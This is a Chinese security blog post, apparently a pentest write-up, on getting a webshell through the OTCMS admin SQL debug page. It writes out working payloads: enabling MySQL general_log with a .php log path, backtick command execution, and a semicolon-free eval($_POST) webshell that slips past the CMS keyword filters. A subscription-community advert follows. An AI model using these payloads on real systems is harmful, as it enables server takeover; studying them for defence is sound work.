#  从PhpmyAdmin getshell到某CMS后台SQL注入漏洞  
joker
                    joker  神农Sec   2026-01-16 01:01  
  
扫码加圈子  
  
获内部资料  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXLicr9MthUBGib1nvDibDT4r6iaK4cQvn56iako5nUwJ9MGiaXFdhNMurGdFLqbD9Rs3QxGrHTAsWKmc1w/640?wx_fmt=jpeg&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fchVnBLMw4kTQ7B9oUy0RGfiacu34QEZgDpfia0sVmWrHcDZCV1Na5wDQ/640?wx_fmt=png&wxfrom=13&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
  
#   
  
专注于SRC漏洞挖掘、红蓝对抗、渗透测试、代码审计JS逆向，CNVD和EDUSRC漏洞挖掘，以及工具分享、前沿信息分享、POC、EXP分享。不定期分享各种好玩的项目及好用的工具，欢迎关注。加内部圈子，文末有彩蛋（知识星球优惠卷）。  
#   
  
文章作者：  
joker  
  
文章来源：https://forum.butian.net/share/1036  
  
01  
  
0x1   
从PhpmyAdmin getshell到某CMS后台SQL注入漏洞  
### 后台SQL getshell  
  
登录后台之后，选择管理员专区=>程序文件检查=>SQL语句调试，能够直接进行SQL命令的执行，随便输入一条查询某张表中数据的SQL语句，BurpSuite抓包  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVNJgKoJQF8nWpgLPIH5yjjVTzLRGZhXGcdN9M2nHYicbxBLefk0sQehY6trYnhOFkvicbOkHRSyzjA/640?wx_fmt=png&from=appmsg "")  
  
放包，直到找到如下的API接口的数据包，可以看到sqlContent  
处为查询的sql语句，看到这的直接想法就是直接写入shell  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVNJgKoJQF8nWpgLPIH5yjj4kqianLvnXib9DqpT7SqM5rWobE6HpzXoUBkFz0EG7lCFSoIpEbhcNMg/640?wx_fmt=png&from=appmsg "")  
  
先用下面的poc打了一发  
```
select <?php phpinfo();?> into outfile "D://phpStudy//www//OTCMS//xxx.php"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVNJgKoJQF8nWpgLPIH5yjjhsy66CZ9oibxs7IibmlrguVao2Vucm24oJuPIUkrvo2uibL77FKNFnFlw/640?wx_fmt=png&from=appmsg "")  
  
可以看到过滤了into outfile  
，根据路径直接来看一下源代码  
OTCMS/admin/sysCheckFile_deal.php#1348  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVNJgKoJQF8nWpgLPIH5yjjgGCLLIPdFia9OCN4YJEfRorQ8hkBXYBEQz9IMNZY8YlEG84GYJIF3ibw/640?wx_fmt=png&from=appmsg "")  
  
首先会对输入的内容进行一个长度校验，如果输入为空就会返回对应的错误信息；之后会对我们输入的内容进行一个大小写转换，这就没办法利用大小写进行一个关键字的绕过了；之后对输入内容进行指定关键词的匹配，如果匹配到了into outfile  
就会直接报错，执行流程也就不会往下走，就算没有匹配到，也会对16进制的标识符0x进行查找匹配，所以利用into outfile  
写入shell的路子基本上就绝了  
  
先接着看流程，在1361行，会对userpwd  
进行一个哈  
希  
加密，MB_uerKey  
是储存在数据库当中的，对输入的pwd  
进行一次MD5  
加密之后和key  
拼接再一次MD5  
加密，然后对我们执行SQL语句时输入的校验登录密码的值进行一个比较，不相等就报错  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVNJgKoJQF8nWpgLPIH5yjjOpyanXD8K2RVkNsoAPl78PXMmdKNVGjA2raym8Ebia6GGuJ2f8BfkmQ/640?wx_fmt=png&from=appmsg "")  
  
下面还有一个匹配分号的过滤，所以如果能够写马，这里就需要用到进制绕过，那么上面为什么会对16进制的标识符进行一个过滤也就能解释的通了。  
#### phpmyadmin的启发  
  
本以为到这里就结束了，没办法了，但是不得不说，真的是灵光一闪，想到了phpmyadmin getshell  
的几种方式，其中之一就是通过查询是否开启日志，并且查看是否有权限开启，并指定日志的存储路径来getshell  
，那么这里也可以进行相同的尝试；我们可以通过开启数据库日志，并指定日志文件，那么其实每条SQL语句都会被写入到日志文件当中，那么也就可以getshell  
了  
```
SET GLOBAL general_log='on'SET GLOBAL general_log_file='C:/phpStudy/www/xxx.php'//指定的文件路径，这里实战中遇到的话，就需要对其绝对路径进行一个猜测了
```  
  
成功在指定路径下创建了日志文件  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVNJgKoJQF8nWpgLPIH5yjjn7Dg0SZpjFaHBaJzeM02z9guwnib19xuYbpgllyICfwSj49WfqGJXMA/640?wx_fmt=png&from=appmsg "")  
  
就在准备写入shell的时候突然想到，分号还是会被匹配到，需要换一种形式，并且之前看过一篇文章也提到了分号的问题，找了找，可以用函数调用的形式执行phpinfo  
```
select <?phpif(phpinfo()){}?>select <?phpwhile(phpinfo()){}?>
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVNJgKoJQF8nWpgLPIH5yjjvcYXEmR3SnLxjkSorjLPC0b5aVBSI6AOdLr0AFGslBwOSZgnCAjO2Q/640?wx_fmt=png&from=appmsg "")  
  
成功写入了，访问一下指定的日志文件  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVNJgKoJQF8nWpgLPIH5yjjMicibbrpFtoZnSno8dDOtqaYRGM4wKBZQSjEgMbricdLKODIrotL8uKtw/640?wx_fmt=png&from=appmsg "")  
  
可以看到phpinfo  
已经成功执行了，但是到这里还是没有办法写入shell  
，还是需要对payload  
进行修改，想到了反引号在php  
中相当于命令执行函数，那么也许并不需要分号进行闭合，清空一下日志文件，执行以下paylaod  
，可以看到成功进行了命令执行并输出了结果，能够命令执行那么就简单了，直接反弹shell  
，之后还可以通过反弹的shell  
再进行shell  
的写入  
```
select '<?php echo `whoami`?>'
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVNJgKoJQF8nWpgLPIH5yjjf1VgovicMsjLPJRyN0KqqXmeaasYwj2Lg4qMc3mXPRcDpm5agX9XjiaA/640?wx_fmt=png&from=appmsg "")  
  
到这里其实已经可以命令  
执行了，但是还有一个问题，php的一句话shell，最后面真的需要分号进行闭合才能够执行么？可能走到了  
误区，平时写shell都是那么写的，想当然觉得没有分号就不能够执行，那就本地先试  
一  
下吧  
```
//shell.php<?phpeval($_POST[1])?>
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVNJgKoJQF8nWpgLPIH5yjjUdtciaPZd4ApUpHhf7aQRRG4RlzgHibHVWib1WfCliap5yuB0cRKJCSxuA/640?wx_fmt=png&from=appmsg "")  
  
结果显而易见是可以成功执行的，那么不难理解php中分号作为分隔符，只要shell后面没有其他的内容，那么有没有分号都是一样的，那么这里的分号匹配对我们来说并没有任何影响，那就直接写入shell  
```
select '<?php eval($_POST[1])?>'
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVNJgKoJQF8nWpgLPIH5yjjf9p1ib9qnyFEibDnPUpeNqIjU3yFRDRjnBbHIjibtRXsLt2JWTRgHNWQQ/640?wx_fmt=png&from=appmsg "")  
### 后记  
  
当时这个也是困扰了许久因为分号的问题，后面还是大哥的提醒去试试看，不仅成功getshell，也是走出了之前形成的一个误区，收获多多。  
  
02  
  
0x2 内部小圈子详情介绍  
  
我们是  
神农安全  
，点赞 + 在看  
 铁铁们点起来，最后祝大家都能心想事成、发大财、行大运。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/mngWTkJEOYJDOsevNTXW8ERI6DU2dZSH3Wd1AqGpw29ibCuYsmdMhUraS4MsYwyjuoB8eIFIicvoVuazwCV79t8A/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/MVPvEL7Qg0F0PmZricIVE4aZnhtO9Ap086iau0Y0jfCXicYKq3CCX9qSib3Xlb2CWzYLOn4icaWruKmYMvqSgk1I0Aw/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
**内部圈子介绍**  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/MVPvEL7Qg0F0PmZricIVE4aZnhtO9Ap08Z60FsVfKEBeQVmcSg1YS1uop1o9V1uibicy1tXCD6tMvzTjeGt34qr3g/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
  
  
**圈子专注于更新src/红蓝攻防相关：**  
  
```
1、维护更新src专项漏洞知识库，包含原理、挖掘技巧、实战案例
2、知识星球专属微信“小圈子交流群”
3、微信小群一起挖洞
4、内部团队专属EDUSRC证书站漏洞报告
5、分享src优质视频课程（企业src/EDUSRC/红蓝队攻防）
6、分享src挖掘技巧tips
7、不定期有众测、渗透测试项目（一起挣钱）
8、不定期有工作招聘内推（工作/护网内推）
9、送全国职业技能大赛环境+WP解析（比赛拿奖）
10、十个专栏会持续更新~提前续费有优惠，好用不贵很实惠
11、每日内部资料分享，内部圈子资料1000+
12、联系圈主获取：内部漏洞知识库+圈子使用手册+内部圈子交流群
13、VX：routing_love，技术交流+疑问解决
```  
  
  
  
  
**内部圈子**  
**专栏介绍**  
  
知识星球内部共享资料截屏详情如下  
  
（只要没有特殊情况，每天都保持更新）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWYcoLuuFqXztiaw8CzfxpMibRSekfPpgmzg6Pn4yH440wEZhQZaJaxJds7olZp5H8Ma4PicQFclzGbQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWYcoLuuFqXztiaw8CzfxpMibgpeLSDuggy2U7TJWF3h7Af8JibBG0jA5fIyaYNUa2ODeG1r5DoOibAXA/640?wx_fmt=png&from=appmsg "")  
  
  
**知识星球——**  
**神农安全**  
  
星球现价   
￥50元  
  
如果你觉得应该加入，就不要犹豫，价格只会上涨，不会下跌  
  
星球人数少于1600人 50元/年  
  
星球人数少于1700人 70元/年  
  
（新人优惠卷20，扫码或者私信我即可领取）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVNJgKoJQF8nWpgLPIH5yjjVsHuVFgsmS144V4tGzfOUqYnr0H028ibrib29Q1BeXJITrgicc1Ve69rA/640?wx_fmt=png&from=appmsg "")  
  
欢迎加入星球一起交流，券后价仅50元！！！ 即将满1600人涨价  
  
长期  
更新，更多的0day/1day漏洞POC/EXP  
  
  
  
  
**内部知识库--**  
**（持续更新中）**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUw2r3biacicUOicXUZHWj2FgFu12KTxgSfI69k7BChztff43VObUMsvvLyqsCRYoQnRKg1ibD7A0U3bQ/640?wx_fmt=png&from=appmsg "")  
  
  
**知识库部分大纲目录如下：**  
  
知识库跟  
知识星球联动，基本上每天保持  
更新，满足圈友的需求  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUw2r3biacicUOicXUZHWj2FgFhXF33IuCNWh4QOXjMyjshticibyeTV3ZmhJeGias5J14egV36UGXvwGSA/640?wx_fmt=png&from=appmsg "")  
  
  
知识库和知识星球有师傅们关注的  
EDUSRC  
和  
CNVD相关内容（内部资料）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUw2r3biacicUOicXUZHWj2FgFKDNucibvibBty5UMNwpjeq1ToHpicPxpNwvRNj3JzWlz4QT1kbFqEdnaA/640?wx_fmt=png&from=appmsg "")  
  
  
还有网上流出来的各种  
SRC/CTF等课程视频  
  
量大管饱，扫描下面的知识星球二维码加入即可  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUw2r3biacicUOicXUZHWj2FgFxYMxoc1ViciafayxiaK0Z26g1kfbVDybCO8R88lqYQvOiaFgQ8fjOJEjxA/640?wx_fmt=png&from=appmsg "")  
  
  
  
不会挖CNVD？不会挖EDURC？不会挖企业SRC？不会打nday和通杀漏洞？  
  
直接加入我们小圈子：  
知识星球+内部圈子交流群+知识库  
  
快来吧！！  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUMULI8zm64NrH1pNBpf6yJ5wUOL9GnsxoXibKezHTjL6Yvuw6y8nm5ibyL388DdDFvuAtGypahRevg/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWUMULI8zm64NrH1pNBpf6yJO0FHgdr6ach2iaibDRwicrB3Ct1WWhg9PA0fPw2J1icGjQgKENYDozpVJg/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1 "")  
  
  
神农安全知识库内部配置很多  
内部工具和资料💾，  
玄机靶场邀请码+EDUSRC邀请码等等  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXjm2h60OalGLbwrsEO8gJDNtEt0PfMwXQRzn9EDBdibLWNDZXVVjog7wDlAUK1h3Y7OicPQCYaw2eA/640?wx_fmt=png&from=appmsg "")  
  
  
快要护网来临，是不是需要  
护网面试题汇总  
？  
问题+答案（超级详细🔎）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXjm2h60OalGLbwrsEO8gJDbLia1oCDxSyuY4j0ooxgqOibabZUDCibIzicM6SL2CMuAAa1Qe4UIRdq1g/640?wx_fmt=png&from=appmsg "")  
  
  
最后，师傅们也是希望找个  
好工作，那么常见的  
渗透测试/安服工程师/驻场面试题目，你值得拥有！！！  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXjm2h60OalGLbwrsEO8gJDicYew8gfSB3nicq9RFgJIKFG1UWyC6ibgpialR2UZlicW3mOBqVib7SLyDtQ/640?wx_fmt=png&from=appmsg "")  
  
  
内部小圈子——  
圈友反馈  
（  
良心价格  
）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWW0s5638ehXF2YQEqibt8Hviaqs0Uv6F4NTNkTKDictgOV445RLkia2rFg6s6eYTSaDunVaRF41qBibY1A/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWW0s5638ehXF2YQEqibt8HviaRhLXFayW3gyfu2eQDCicyctmplJfuMicVibquicNB3Bjdt0Ukhp8ib1G5aQ/640?wx_fmt=png&from=appmsg "")  
  
  
**神农安全公开交流群**  
  
有需要的师傅们直接扫描文章二维码加入，然后要是后面群聊二维码扫描加入不了的师傅们，直接扫描文章开头的二维码加我（备注加群）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXQQxwDn7nBel5rw7fdWUCoCr3O7DicI6OKcr5k2hbfORsyBiaFWWrHxNtAq0skiaZUuuGGAEE6AXYQA/640?wx_fmt=jpeg&from=appmsg "")  
```
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/b7iaH1LtiaKWW8vxK39q53Q3oictKW3VAXz4Qht144X0wjJcOMqPwhnh3ptlbTtxDvNMF8NJA6XbDcljZBsibalsVQ/640?wx_fmt=gif "")  
  
  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&wxfrom=13&tp=wxpic "")  
  
**往期回顾**  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&wxfrom=13&tp=wxpic "")  
  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
[手把手js逆向断点调试&js逆向前端加密对抗&企业SRC实战分享](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247495361&idx=1&sn=48283073b325e360823da8dec27a7508&scene=21#wechat_redirect)  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
[浅谈src漏洞挖掘中容易出洞的几种姿势](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247489731&idx=1&sn=c3a5ef01648fad496ecda36b653b6e21&scene=21#wechat_redirect)  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
[HVV护网行动 | 分享最近攻防演练HVV漏洞复盘](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247488672&idx=1&sn=493bb70011a02eb971ff1b74c733f1d9&scene=21#wechat_redirect)  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
[攻防演练｜分享最近一次攻防演练RTSP奇特之旅](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247492377&idx=1&sn=a94ad30e30e08bd96e888dad744e9814&scene=21#wechat_redirect)  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
[JS漏洞挖掘｜分享使用FindSomething联动的挖掘思路](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247492315&idx=1&sn=88991e98058a277e267a9a79b8518e16&scene=21#wechat_redirect)  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
[渗透测试 ｜ 从jeecg接口泄露到任意管理员用户接管+SQL注入漏洞](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247493292&idx=1&sn=611fd43361089a30e5f7bcda21274b95&scene=21#wechat_redirect)  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
[分享SRC中后台登录处站点的漏洞挖掘技巧](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247485439&idx=1&sn=3fd7e4cef57edca8e73104f8af38fc05&scene=21#wechat_redirect)  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
[企业SRC支付漏洞&EDUSRC&众测挖掘思路技巧操作分享](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247492839&idx=1&sn=b9781f60580c1da8e2151166f0494ba5&scene=21#wechat_redirect)  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
[渗透测试 ｜ 分享某次项目上的渗透测试漏洞复盘](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247493495&idx=1&sn=791bebc6faa651cc3c585c2f5f481d21&scene=21#wechat_redirect)  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
[【宝典】分享云安全浪潮src漏洞挖掘技巧](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247494877&idx=1&sn=2d00c0f651fd7375e881be86638e53ce&scene=21#wechat_redirect)  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
[实战SRC挖掘｜微信小程序渗透漏洞复盘](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247494468&idx=1&sn=f0da4b4ff7763cbb83b858fb5a8964f9&scene=21#wechat_redirect)  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
[综合资产测绘 | 手把手带你搞定信息收集](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247493749&idx=1&sn=d2e0febcdcf9dcd8aa44be0d43b51936&scene=21#wechat_redirect)  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
[【宝典】针对若依系统nday的常见各种姿势利用](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247493489&idx=1&sn=d3ef10a1ae3b8c161d7174cb42702fac&scene=21#wechat_redirect)  
  
  
  
